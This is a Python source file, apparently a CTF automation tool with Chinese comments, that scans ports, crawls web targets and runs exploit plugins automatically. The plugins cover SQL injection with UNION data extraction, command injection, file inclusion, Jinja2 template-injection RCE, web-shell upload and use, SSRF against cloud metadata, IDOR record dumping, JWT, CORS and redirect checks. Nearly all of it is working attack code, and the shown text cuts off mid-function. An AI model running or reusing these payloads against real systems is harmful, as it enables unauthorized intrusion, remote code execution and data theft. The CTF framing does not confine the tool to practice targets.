#!/usr/bin/python3
"""
CTF Automation Engine v6 — 完整版
插件架构 | 结构化输出 | 智能爬虫 | 全漏洞覆盖 | AWD防御
"""
import subprocess, os, re, json, time, sys, ssl, hashlib, sqlite3, base64, argparse, socket
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Any
import urllib.request, urllib.parse

# ═══════════════════════════════════════════════
# 基础设施
# ═══════════════════════════════════════════════
TK = "/root/ctf-toolkit"
LOOT = f"{TK}/loot"
LOG = None
TIMEOUT = 8
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

class Severity(str, Enum):
    INFO="info"; LOW="low"; MEDIUM="medium"; HIGH="high"; CRITICAL="critical"

@dataclass
class Finding:
    type: str; target: str; url: str=""; path: str=""; param: str=""
    severity: Severity=Severity.MEDIUM; confidence: float=0.5
    evidence: str=""; exploit_status: str="detected"
    artifacts: list=field(default_factory=list)
    def id(self): return hashlib.sha1(f"{self.type}{self.url}{self.path}{self.param}{self.evidence[:50]}".encode()).hexdigest()[:12]

def sh(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout, cwd=TK)
        return r.stdout+r.stderr, r.stderr, r.returncode
    except: return "", "error", -1

def log(msg, level="info"):
    ts = time.strftime("%H:%M:%S"); line = f"[{ts}] [{level}] {msg}"
    print(line, flush=True)
    if LOG:
        with open(LOG, "a") as f: f.write(line+"\n")

def save(tag, data, loot):
    os.makedirs(loot, exist_ok=True)
    with open(f"{loot}/{tag}.txt", "a") as f: f.write(str(data)+"\n")

def save_json(tag, data, loot):
    os.makedirs(loot, exist_ok=True)
    with open(f"{loot}/{tag}.json", "w") as f: json.dump(data, f, indent=2, default=str)

def ue(s): return urllib.parse.quote(str(s))
def extract_flags(text): return list(set(re.findall(r"(?:flag|FLAG|ctf|CTF|key|KEY|secret|token)\{[^}]{3,80}\}", str(text))))
def strip_html(t): return re.sub(r'<[^>]+>', '', str(t)).strip()

def http_req(method, url, data=None, timeout=TIMEOUT, headers=None, follow=True):
    """统一HTTP请求: 返回 (body, code, headers_dict)"""
    hdrs = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    if headers: hdrs.update(headers)
    try:
        body_enc = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else data
        req = urllib.request.Request(url, data=body_enc, headers=hdrs, method=method)
        resp = urllib.request.urlopen(req, timeout=timeout, context=SSL_CTX)
        return resp.read().decode(errors="ignore"), resp.getcode(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="ignore"), e.code, dict(e.headers) if hasattr(e,'headers') else {}
    except Exception as e:
        return str(e), 0, {}

def http_get(url, timeout=TIMEOUT): return http_req("GET", url, timeout=timeout)
def http_post(url, data, timeout=TIMEOUT): return http_req("POST", url, data=data, timeout=timeout)

def normalize_target(raw):
    raw = raw.strip()
    if raw.startswith(("http://","https://")):
        p = urllib.parse.urlparse(raw)
        return {"base_url":raw.rstrip("/"),"host":p.hostname,"port":p.port,"scheme":p.scheme,"is_url":True}
    return {"base_url":None,"host":raw,"port":None,"scheme":None,"is_url":False}

# ═══════════════════════════════════════════════
# 智能爬虫: 从HTML自动提取端点/参数/表单
# ═══════════════════════════════════════════════
class Crawler:
    @staticmethod
    def extract_links(html, base_url):
        """从HTML提取所有链接"""
        links = set()
        for m in re.finditer(r'href="([^"]*)"', html):
            href = m.group(1)
            if href.startswith("/"): links.add(href.split("?")[0].split("#")[0])
            elif href.startswith("http"): links.add(href)
        for m in re.finditer(r'action="([^"]*)"', html):
            action = m.group(1)
            if action.startswith("/"): links.add(action.split("?")[0])
        return list(links)

    @staticmethod
    def extract_forms(html):
        """从HTML提取表单(字段名+方法)"""
        forms = []
        for fm in re.finditer(r'<form[^>]*(?:action="([^"]*)")?[^>]*(?:method="([^"]*)")?[^>]*>(.*?)</form>', html, re.S|re.I):
            action = fm.group(1) or ""
            method = (fm.group(2) or "GET").upper()
            body = fm.group(3)
            params = []
            for inp in re.finditer(r'name="([^"]*)"', body):
                params.append(inp.group(1))
            if params:
                forms.append({"action":action, "method":method, "params":params})
        return forms

    @staticmethod
    def extract_params(html):
        """从HTML提取所有name参数"""
        return list(set(re.findall(r'name="([^"]*)"', html)))

    @staticmethod
    def extract_js_routes(html):
        """从JS中提取API路由"""
        routes = set()
        for m in re.finditer(r'["\'/](api/[a-zA-Z0-9_/]+)', html):
            routes.add("/"+m.group(1))
        for m in re.finditer(r'["\'/](graphql|swagger|admin|debug|console)', html):
            routes.add("/"+m.group(1))
        return list(routes)

    @staticmethod
    def crawl(url, max_depth=2):
        """智能爬虫: 提取链接+表单+参数+JS路由"""
        all_links, all_forms, all_params = [], [], []
        visited = set()
        queue = [(url, 0)]
        while queue:
            current, depth = queue.pop(0)
            if current in visited or depth > max_depth: continue
            visited.add(current)
            body, code, _ = http_get(current, 3)
            if code != 200: continue
            links = Crawler.extract_links(body, url)
            forms = Crawler.extract_forms(body)
            params = Crawler.extract_params(body)
            js_routes = Crawler.extract_js_routes(body)
            all_links.extend(links)
            all_forms.extend(forms)
            all_params.extend(params)
            for route in js_routes:
                if route not in visited: queue.append((f"{url}{route}", depth+1))
            for link in links:
                if link.startswith("/") and link not in visited:
                    queue.append((f"{url}{link}", depth+1))
        return {"links":list(set(all_links)), "forms":all_forms, "params":list(set(all_params))}

# ═══════════════════════════════════════════════
# 插件基类
# ═══════════════════════════════════════════════
class Plugin:
    name = "base"
    vuln_type = "generic"
    severity = Severity.MEDIUM
    def match(self, ctx): return True
    def detect(self, ctx): return []
    def exploit(self, finding, ctx): return []

PLUGINS = []
def register(cls):
    PLUGINS.append(cls())
    return cls

# ═══════════════════════════════════════════════
# 侦察模块
# ═══════════════════════════════════════════════
class Recon:
    @staticmethod
    def scan(target, loot):
        log(f"网络侦察: {target}")
        services = {}
        sh(f"masscan -p1-65535 {target} --rate=8000 -oL {loot}/masscan.txt", 90)
        ports = set()
        try:
            for line in open(f"{loot}/masscan.txt"):
                parts = line.split()
                if len(parts)>=3 and parts[0]=="open": ports.add(int(parts[2]))
        except: pass
        if not ports:
            sh(f"nmap -Pn -T4 --top-ports 300 {target} -oN {loot}/nmap_quick.txt", 90)
            try:
                for line in open(f"{loot}/nmap_quick.txt"):
                    m = re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
                    if m: ports.add(int(m.group(1)))
            except: pass
        if not ports: return {}
        ps = ",".join(str(p) for p in sorted(ports))
        log(f"开放端口: {ps}")
        sh(f"nmap -Pn -sV -sC -p {ps} {target} -oN {loot}/nmap.txt", 120)
        try:
            for line in open(f"{loot}/nmap.txt"):
                m = re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
                if m: services[int(m.group(1))] = {"svc":m.group(2),"ver":m.group(3).strip()}
        except: pass
        for p,s in services.items(): log(f"  {p}/tcp -> {s['svc']} {s['ver']}")
        return services

    @staticmethod
    def find_http(target, ports, loot):
        urls = []
        candidates = sorted(ports)+[80,443,8080,8443,8000,8888,9999,7777]
        candidates = list(dict.fromkeys(candidates))
        def probe(p):
            for proto in ("http","https"):
                url = f"{proto}://{target}:{p}"
                _, code, _ = http_get(url, 3)
                if code and code!=0: return url
            return None
        with ThreadPoolExecutor(max_workers=10) as pool:
            for result in pool.map(probe, candidates):
                if result and result not in urls:
                    urls.append(result)
                    log(f"HTTP: {result}")
        save("http_urls", "\n".join(urls), loot)
        return urls

    @staticmethod
    def fingerprint(url, loot):
        body, code, headers = http_get(url, 5)
        info = {"code":code}
        for hdr in ["Server","X-Powered-By","Set-Cookie","X-AspNet-Version"]:
            val = headers.get(hdr,"")
            if val: info[hdr.lower().replace("-","_")] = val[:80]
        bl = body.lower()
        for fw in ["flask","django","spring","laravel","thinkphp","express","rails","asp.net"]:
            if fw in bl: info["framework"]=fw.title()
        save("fingerprint", json.dumps(info), loot)
        return info

# ═══════════════════════════════════════════════
# 端点发现
# ═══════════════════════════════════════════════
class Discovery:
    PATHS = {
        "sqli":  ["/sqli","/search","/query","/user","/login","/admin","/api","/page","/item","/news","/product","/detail","/list","/member","/profile"],
        "cmdi":  ["/cmdi","/cmd","/ping","/exec","/diagnostic","/system","/tools","/debug","/test","/run"],
        "lfi":   ["/lfi","/include","/file","/page","/load","/read","/view","/show","/download","/template","/render"],
        "ssti":  ["/ssti","/template","/render","/greeting","/hello","/preview","/view","/page","/index"],
        "xss":   ["/xss","/search","/comment","/feedback","/guestbook","/post","/message","/note","/board"],
        "upload":["/upload","/api/upload","/file/upload","/api/file","/import","/attach","/image"],
        "idor":  ["/api/user/","/api/v1/user/","/api/member/","/api/order/","/api/profile/","/user/"],
        "ssrf":  ["/redirect","/url","/fetch","/proxy","/load","/download","/image","/callback","/webhook"],
        "graphql":["/graphql","/api/graphql","/gql","/graphiql","/playground"],
        "jwt":   ["/api/auth","/api/login","/api/token","/auth/login","/oauth/token"],
        "xxe":   ["/api/import","/api/upload/xml","/api/parse","/soap","/api/feed"],
        "info":  ["/.git/HEAD","/.env","/robots.txt","/sitemap.xml","/admin","/login","/api",
                  "/actuator/env","/actuator/heapdump","/swagger-ui.html","/api-docs","/graphql",
                  "/phpinfo.php","/flag","/flag.txt","/config","/config.php","/config.yml",
                  "/debug","/console","/trace","/status","/info","/health","/metrics",
                  "/wp-admin","/phpmyadmin","/adminer.php","/.svn/entries","/web.config",
                  "/backup.zip","/www.zip","/db.sql","/database.sql","/readme.md",
                  "/swagger.json","/v2/api-docs","/openapi.json","/.git/config",
                  "/.git/index","/wp-config.php.bak","/dump.sql","/database.sqlite"],
    }

    @staticmethod
    def discover(url, loot):
        log(f"端点发现: {url}")
        endpoints = {}
        all_paths = set()
        for group in Discovery.PATHS.values(): all_paths.update(group)
        # 爬虫发现额外路径
        crawl = Crawler.crawl(url, max_depth=1)
        all_paths.update(crawl["links"])
        save("crawl", json.dumps(crawl, indent=2), loot)
        def probe(path):
            body, code, _ = http_get(f"{url}{path}", 3)
            if code and code not in (0,404,502,503): return path, code, len(body)
            return None
        with ThreadPoolExecutor(max_workers=20) as pool:
            for result in pool.map(probe, all_paths):
                if result:
                    path, code, size = result
                    endpoints[path] = {"code":code,"size":size}
                    if code==200 and size>50: log(f"  [+] {path} -> {code} ({size}B)")
        save("endpoints", json.dumps(endpoints, indent=2), loot)
        log(f"发现 {len(endpoints)} 个端点")
        return endpoints, crawl

    @staticmethod
    def categorize(endpoints, crawl):
        cats = {}
        for group, paths in Discovery.PATHS.items():
            found = [p for p in paths if p in endpoints]
            if found: cats[group] = found
        # 用爬虫发现的参数补充
        if crawl.get("params"): cats["crawl_params"] = crawl["params"]
        if crawl.get("forms"):
            for form in crawl["forms"]:
                if form["action"]: cats.setdefault("forms", []).append(form["action"])
        return cats

# ═══════════════════════════════════════════════
# 漏洞插件
# ═══════════════════════════════════════════════

@register
class SQLiPlugin(Plugin):
    name = "sqli"; vuln_type = "sql_injection"; severity = Severity.CRITICAL
    SQLI_ERRS = re.compile(r"(?i)(sql syntax|mysql|ORA-|PG |sqlite|Unclosed|microsoft.*ODBC|error in your|SQL Error|unrecognized token|near .{1,20}: syntax error|valid MySQL|valid PostgreSQL)")

    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("sqli",[]); forms = ctx["cats"].get("forms",[])
        params = ["id","uid","user","page","cat","item","search","q","name","type","sort","order"]
        # 爬虫发现的表单参数
        for form in ctx["crawl"].get("forms",[]):
            params.extend(form.get("params",[]))
        params = list(set(params))

        for path in paths + forms:
            for param in params:
                # 错误型 GET
                for payload in ["'", "\"", "')", "1' OR '1'='1"]:
                    body, code, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
                    if self.SQLI_ERRS.search(body):
                        f = Finding("sqli", ctx["target"], url, path, param, Severity.CRITICAL, 0.9, body[:200])
                        findings.append(f); log(f"SQLi(GET): {path}?{param}={payload}", "hit")
                        self._extract(url, path, param, ctx["loot"]); break
                # 错误型 POST
                for payload in ["'", "\"", "')"]:
                    body, code, _ = http_post(f"{url}{path}", {param: payload})
                    if self.SQLI_ERRS.search(body):
                        f = Finding("sqli", ctx["target"], url, path, param, Severity.CRITICAL, 0.9, body[:200])
                        findings.append(f); log(f"SQLi(POST): {path} {param}={payload}", "hit"); break
                # 时间盲注 (多DBMS)
                for sleep_payload, dbms in [
                    ("1 AND SLEEP(3)--","MySQL"), ("1; WAITFOR DELAY '0:0:3'--","MSSQL"),
                    ("1; SELECT pg_sleep(3)--","PostgreSQL"), ("1 AND 1=randomblob(500000000)--","SQLite")]:
                    t0 = time.time()
                    http_get(f"{url}{path}?{param}={ue(sleep_payload)}", 8)
                    elapsed = time.time() - t0
                    if elapsed >= 2.5:
                        # 确认: 再测一次
                        t0 = time.time()
                        http_get(f"{url}{path}?{param}={ue(sleep_payload)}", 8)
                        if time.time() - t0 >= 2.5:
                            f = Finding("sqli", ctx["target"], url, path, param, Severity.HIGH, 0.8, f"time-based ({dbms})")
                            findings.append(f); log(f"SQLi(time/{dbms}): {path}?{param}", "hit"); break
                # 布尔盲注
                t_body, _, _ = http_get(f"{url}{path}?{param}=1%20AND%201=1")
                f_body, _, _ = http_get(f"{url}{path}?{param}=1%20AND%201=2")
                if abs(len(t_body)-len(f_body))>50 and len(t_body)>100 and len(f_body)>100:
                    f = Finding("sqli", ctx["target"], url, path, param, Severity.HIGH, 0.7, f"bool true={len(t_body)} false={len(f_body)}")
                    findings.append(f); log(f"SQLi(bool): {path}?{param}", "hit")
            if findings: break
        return findings

    def _extract(self, url, path, param, loot):
        """UNION注入自动提取(DBMS感知)"""
        # 判断列数
        cols = 0
        for c in range(1,20):
            payload = f"-1 UNION SELECT {','.join('NULL' for _ in range(c))}--"
            body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
            if self.SQLI_ERRS.search(body) is None:
                cols = c; break
        if not cols: return
        log(f"  列数: {cols}")
        # 找显示位
        disp = -1
        for i in range(cols):
            cols_list = ['TESTMARKER' if j==i else 'NULL' for j in range(cols)]
            payload = "-1 UNION SELECT " + ",".join(cols_list) + "--"
            body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
            if "TESTMARKER" in body: disp = i; break
        if disp < 0: return
        log(f"  显示位: 第{disp+1}列")
        # DBMS检测 + 提取
        for dbms, queries in [
            ("MySQL", [("version()","版本"),("database()","数据库"),
                       ("GROUP_CONCAT(table_name SEPARATOR 0x0a)","表")]),
            ("SQLite", [("sqlite_version()","版本"),("name","表")]),
            ("PostgreSQL", [("version()","版本"),("current_database()","数据库")]),
        ]:
            for query, label in queries:
                cols_list = [query if j==disp else 'NULL' for j in range(cols)]
                payload = "-1 UNION SELECT " + ",".join(cols_list) + "--"
                body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
                data = strip_html(body)
                if len(data)>5 and "error" not in data.lower()[:100]:
                    log(f"  {label}({dbms}): {data[:100]}")
                    save(f"sqli_{label}", data[:2000], ctx["loot"])
        # 尝试读flag表
        for table in ["flag","flags","secret","secrets","ctf","config","settings"]:
            for query in [f"GROUP_CONCAT(value SEPARATOR 0x0a)", f"GROUP_CONCAT(flag SEPARATOR 0x0a)"]:
                cols_list = [query if j==disp else 'NULL' for j in range(cols)]
                payload = "-1 UNION SELECT " + ",".join(cols_list) + f" FROM {table}--"
                body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
                for flag in extract_flags(body):
                    log(f"  FLAG(SQLi): {flag}", "hit"); save("flags", flag, ctx["loot"])

@register
class CMDiPlugin(Plugin):
    name = "cmdi"; vuln_type = "command_injection"; severity = Severity.CRITICAL
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("cmdi",[])
        params = ["host","ip","cmd","ping","domain","target","addr","server"]
        for path in paths:
            for param in params:
                for sep in [";","|","||","&&","`"]:
                    nonce = f"CTF{int(time.time())%10000}"
                    payload = f"echo {nonce}"
                    # GET
                    body, _, _ = http_get(f"{url}{path}?{param}={ue(f'127.0.0.1{sep}{payload}')}")
                    # POST
                    body2, _, _ = http_post(f"{url}{path}", {param: f"127.0.0.1{sep}{payload}"})
                    for b in [body, body2]:
                        if nonce in b:
                            f = Finding("cmdi", ctx["target"], url, path, param, Severity.CRITICAL, 0.95, f"nonce={nonce}")
                            findings.append(f); log(f"CMDi: {path}?{param} (sep={sep})", "hit")
                            # 自动执行
                            for cmd in ["id","cat /flag 2>/dev/null","cat /flag.txt 2>/dev/null",
                                        "env | grep -i flag","find / -name flag* -type f 2>/dev/null | head -5"]:
                                out, _, _ = http_get(f"{url}{path}?{param}={ue(f'127.0.0.1{sep}{cmd}')}")
                                clean = strip_html(out)
                                for flag in extract_flags(clean):
                                    log(f"  FLAG(CMDi): {flag}", "hit"); save("flags", flag, ctx["loot"])
                                if len(clean)>20: save("cmdi_output", f"{cmd}: {clean[:500]}", ctx["loot"])
                            return findings
        return findings

@register
class LFIPlugin(Plugin):
    name = "lfi"; vuln_type = "local_file_inclusion"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("lfi",[])
        params = ["page","file","include","path","template","doc","lang","inc","download"]
        payloads = [
            ("../../../../../../etc/passwd", r"root:"),
            ("....//....//....//....//....//etc/passwd", r"root:"),
            ("php://filter/convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{40,}"),
            ("/etc/passwd%00", r"root:"),
            ("file:///etc/passwd", r"root:"),
        ]
        for path in paths:
            for param in params:
                for payload, pattern in payloads:
                    body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
                    if re.search(pattern, body):
                        f = Finding("lfi", ctx["target"], url, path, param, Severity.HIGH, 0.9, body[:200])
                        findings.append(f); log(f"LFI: {path}?{param}", "hit")
                        # 读取关键文件
                        for fpath in ["/etc/passwd","/etc/hosts","/flag","/flag.txt","/var/www/html/.env"]:
                            body2, _, _ = http_get(f"{url}{path}?{param}={ue(f'../../../../../../{fpath}')}")
                            for flag in extract_flags(body2):
                                log(f"  FLAG(LFI): {flag}", "hit"); save("flags", flag, ctx["loot"])
                            if len(body2)>30: save("lfi_read", f"=== {fpath} ===\n{body2[:2000]}", ctx["loot"])
                        # 解码PHP源码
                        body3, _, _ = http_get(f"{url}{path}?{param}={ue('php://filter/convert.base64-encode/resource=index.php')}")
                        b64 = re.search(r"[A-Za-z0-9+/]{40,}={0,2}", body3)
                        if b64:
                            try:
                                src = base64.b64decode(b64.group()).decode(errors="ignore")
                                if "<?php" in src: save("source_leaked.php", src[:5000], ctx["loot"])
                                for flag in extract_flags(src):
                                    log(f"  FLAG(源码): {flag}", "hit"); save("flags", flag, ctx["loot"])
                            except: pass
                        return findings
        return findings

@register
class SSTIPlugin(Plugin):
    name = "ssti"; vuln_type = "server_side_template_injection"; severity = Severity.CRITICAL
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("ssti",[])
        params = ["name","template","view","page","content","input","title","text"]
        for path in paths:
            for param in params:
                for payload, expected in [("{{7*7}}","49"),("${7*7}","49"),("#{7*7}","49"),("*{7*7}","49")]:
                    body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
                    body2, _, _ = http_post(f"{url}{path}", {param: payload})
                    body = body if expected in body else body2
                    if expected in body:
                        f = Finding("ssti", ctx["target"], url, path, param, Severity.CRITICAL, 0.9, body[:200])
                        findings.append(f); log(f"SSTI: {path}?{param}={payload}", "hit")
                        # RCE
                        rce_list = [
                            ("{{config.__class__.__init__.__globals__['os'].popen('CMD').read()}}","Jinja2"),
                            ("{{lipsum.__globals__['os'].popen('CMD').read()}}","Jinja2"),
                            ("{{cycler.__init__.__globals__.os.popen('CMD').read()}}","Jinja2"),
                        ]
                        for rce_tpl, engine in rce_list:
                            for cmd in ["id","cat /flag","cat /flag.txt","env"]:
                                rce = rce_tpl.replace("CMD", cmd)
                                for u in [f"{url}{path}?{param}={ue(rce)}"]:
                                    rbody, _, _ = http_get(u)
                                    if "uid=" in rbody or "flag" in rbody.lower():
                                        log(f"  RCE({engine}): {cmd}", "hit"); save("ssti_rce", f"{cmd}: {strip_html(rbody)[:500]}", ctx["loot"])
                                        for flag in extract_flags(rbody):
                                            log(f"  FLAG(SSTI): {flag}", "hit"); save("flags", flag, ctx["loot"])
                                        return findings
                        # SECRET_KEY
                        for kp in ["{{config.SECRET_KEY}}","{{config.items()}}"]:
                            kbody, _, _ = http_get(f"{url}{path}?{param}={ue(kp)}")
                            key = re.search(r"[a-f0-9]{16,64}", kbody)
                            if key: log(f"  SECRET_KEY: {key.group()}", "hit"); save("secret_key", key.group(), ctx["loot"])
                        return findings
        return findings

@register
class XSSPlugin(Plugin):
    name = "xss"; vuln_type = "cross_site_scripting"; severity = Severity.MEDIUM
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("xss",[])
        params = ["q","search","name","input","text","content","comment","msg","keyword"]
        for path in paths:
            for param in params:
                for payload in ["<script>alert(1)</script>","'><script>alert(1)</script>","<img src=x onerror=alert(1)>"]:
                    body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}")
                    body2, _, _ = http_post(f"{url}{path}", {param: payload})
                    if payload in body or payload in body2:
                        findings.append(Finding("xss", ctx["target"], url, path, param, Severity.MEDIUM, 0.9, payload[:50]))
                        log(f"XSS: {path}?{param}", "hit"); return findings
        return findings

@register
class IDORPlugin(Plugin):
    name = "idor"; vuln_type = "insecure_direct_object_reference"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("idor",[])
        for base_path in paths:
            bodies = {}
            for uid in range(1, 6):
                body, code, _ = http_get(f"{url}{base_path}{uid}", 3)
                if code==200 and len(body)>20: bodies[uid] = body
            if len(bodies)>=2:
                if bodies[1] != bodies[2]:
                    sensitive = any(k in bodies[1].lower() for k in ["email","phone","token","secret","password","role"])
                    if sensitive:
                        findings.append(Finding("idor", ctx["target"], url, base_path, "", Severity.HIGH, 0.8, bodies[1][:200]))
                        log(f"IDOR: {base_path}{{1,2,...}}", "hit")
                        # 批量枚举
                        for uid in range(1, 50):
                            body, code, _ = http_get(f"{url}{base_path}{uid}", 2)
                            if code==200 and len(body)>20:
                                save("idor_dump", f"=== ID {uid} ===\n{body[:1000]}", ctx["loot"])
                                for flag in extract_flags(body):
                                    log(f"  FLAG(IDOR): {flag}", "hit"); save("flags", flag, ctx["loot"])
                        return findings
        return findings

@register
class GraphQLPlugin(Plugin):
    name = "graphql"; vuln_type = "graphql_introspection"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("graphql",[])
        for path in paths:
            for q in ['{ __schema { types { name } } }', '{ __type(name:"Query") { fields { name } } }']:
                body, code, _ = http_post(f"{url}{path}", {"query": q})
                if code==200 and "__schema" in body:
                    findings.append(Finding("graphql", ctx["target"], url, path, "", Severity.HIGH, 0.9, body[:300]))
                    log(f"GraphQL内省: {path}", "hit"); save("graphql_schema", body[:3000], ctx["loot"])
                    for dq in ['{ flag }','{ users { id username role } }','{ secrets { key value } }']:
                        b, _, _ = http_post(f"{url}{path}", {"query": dq})
                        for flag in extract_flags(b):
                            log(f"  FLAG(GraphQL): {flag}", "hit"); save("flags", flag, ctx["loot"])
                        if "flag" in b.lower(): save("graphql_data", b[:3000], ctx["loot"])
                    return findings
        return findings

@register
class SSRFPlugin(Plugin):
    name = "ssrf"; vuln_type = "server_side_request_forgery"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("ssrf",[])
        params = ["url","uri","u","next","redirect","target","dest","callback","webhook","image","file","path","src"]
        for path in paths:
            for param in params:
                for payload, indicator in [("http://127.0.0.1/","localhost"),("file:///etc/passwd","root:"),
                                           ("file:///flag","flag{"),("http://169.254.169.254/latest/meta-data/","ami-id")]:
                    body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}", 5)
                    if indicator in body.lower():
                        findings.append(Finding("ssrf", ctx["target"], url, path, param, Severity.HIGH, 0.8, body[:200]))
                        log(f"SSRF: {path}?{param}={payload[:30]}", "hit")
                        for flag in extract_flags(body):
                            log(f"  FLAG(SSRF): {flag}", "hit"); save("flags", flag, ctx["loot"])
                        return findings
        return findings

@register
class OpenRedirectPlugin(Plugin):
    name = "open_redirect"; vuln_type = "open_redirect"; severity = Severity.LOW
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("ssrf",[])
        params = ["url","redirect","next","return","goto","dest","target","continue"]
        evil = "https://evil.com"
        for path in paths:
            for param in params:
                _, code, headers = http_get(f"{url}{path}?{param}={ue(evil)}", 3)
                if evil in headers.get("Location",""):
                    findings.append(Finding("open_redirect", ctx["target"], url, path, param, Severity.LOW, 0.9))
                    log(f"开放重定向: {path}?{param}", "hit"); return findings
        return findings

@register
class JWTPlugin(Plugin):
    name = "jwt"; vuln_type = "jwt_vulnerability"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("jwt",[])
        for path in paths:
            body, _, _ = http_get(f"{url}{path}", 3)
            m = re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", body)
            if m:
                token = m.group()
                try:
                    hdr = json.loads(base64.urlsafe_b64decode(token.split(".")[0]+"=="))
                    alg = hdr.get("alg","")
                    findings.append(Finding("jwt", ctx["target"], url, path, "", Severity.HIGH, 0.8, f"alg={alg}"))
                    log(f"JWT: {path} alg={alg}", "hit"); save("jwt_tokens", token, ctx["loot"])
                    if alg.lower()=="none":
                        findings.append(Finding("jwt_bypass", ctx["target"], url, path, "", Severity.CRITICAL, 0.95, "alg=none"))
                        log(f"  JWT alg=none绕过!", "hit")
                except: pass
        return findings

@register
class DownloadTraversalPlugin(Plugin):
    name = "download_traversal"; vuln_type = "path_traversal"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("ssrf",[])
        params = ["file","path","doc","download","filename","name"]
        for path in paths:
            for param in params:
                for payload in ["../../../../../../etc/passwd","/etc/passwd","../../../../../../flag"]:
                    body, code, _ = http_get(f"{url}{path}?{param}={ue(payload)}", 3)
                    if code==200 and "root:" in body:
                        findings.append(Finding("download_traversal", ctx["target"], url, path, param, Severity.HIGH, 0.9, body[:200]))
                        log(f"下载穿越: {path}?{param}", "hit")
                        for flag in extract_flags(body):
                            log(f"  FLAG(下载): {flag}", "hit"); save("flags", flag, ctx["loot"])
                        return findings
        return findings

@register
class CORSPlugin(Plugin):
    name = "cors"; vuln_type = "cors_misconfiguration"; severity = Severity.MEDIUM
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        _, _, headers = http_req("GET", url, headers={"Origin":"http://evil.com"})
        acao = headers.get("Access-Control-Allow-Origin","")
        acac = headers.get("Access-Control-Allow-Credentials","")
        if "evil.com" in acao:
            sev = Severity.HIGH if acac.lower()=="true" else Severity.MEDIUM
            findings.append(Finding("cors", ctx["target"], url, "", "", sev, 0.9, f"ACAO={acao} ACAC={acac}"))
            log(f"CORS: ACAO={acao} ACAC={acac}", "hit")
        return findings

@register
class UploadPlugin(Plugin):
    name = "upload"; vuln_type = "file_upload"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("upload",[])
        for path in paths:
            body, code, _ = http_get(f"{url}{path}", 3)
            if code==200 and ("upload" in body.lower() or "file" in body.lower() or "form" in body.lower()):
                shell = '<?php system($_GET["cmd"]);?>'
                try:
                    import http.client
                    from urllib.parse import urlparse as up
                    parsed = up(f"{url}{path}")
                    conn_class = http.client.HTTPSConnection if parsed.scheme=="https" else http.client.HTTPConnection
                    conn = conn_class(parsed.hostname, parsed.port or (443 if parsed.scheme=="https" else 80), timeout=5)
                    boundary = "----CTFBoundary"
                    body_data = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n{shell}\r\n--{boundary}--\r\n"
                    conn.request("POST", parsed.path, body=body_data, headers={"Content-Type":f"multipart/form-data; boundary={boundary}"})
                    resp = conn.getresponse(); resp.read()
                    if resp.status in (200,201):
                        findings.append(Finding("upload", ctx["target"], url, path, "", Severity.HIGH, 0.7, f"status={resp.status}"))
                        log(f"Upload: {path} -> {resp.status}", "hit")
                        # 验证shell
                        for guess in ["/uploads/test.php","/upload/test.php","/files/test.php","/static/uploads/test.php"]:
                            sbody, scode, _ = http_get(f"{url}{guess}?cmd=id", 3)
                            if scode==200 and "uid=" in sbody:
                                log(f"  Upload RCE: {guess}", "hit"); save("webshells", f"{url}{guess}", ctx["loot"])
                                for cmd in ["cat /flag","cat /flag.txt","env"]:
                                    out, _, _ = http_get(f"{url}{guess}?cmd={ue(cmd)}")
                                    for flag in extract_flags(out):
                                        log(f"  FLAG(Upload): {flag}", "hit"); save("flags", flag, ctx["loot"])
                                break
                except: pass
        return findings

@register
class AuthBypassPlugin(Plugin):
    name = "auth_bypass"; vuln_type = "authentication_bypass"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("info",[])
        for path in ["/admin","/admin/","/manage","/panel","/dashboard","/api/admin","/api/config","/debug","/console"]:
            body, code, _ = http_get(f"{url}{path}", 3)
            if code==200 and len(body)>100:
                if any(k in body.lower() for k in ["admin","dashboard","manage","panel","config","secret","flag","password"]):
                    findings.append(Finding("auth_bypass", ctx["target"], url, path, "", Severity.HIGH, 0.8, body[:200]))
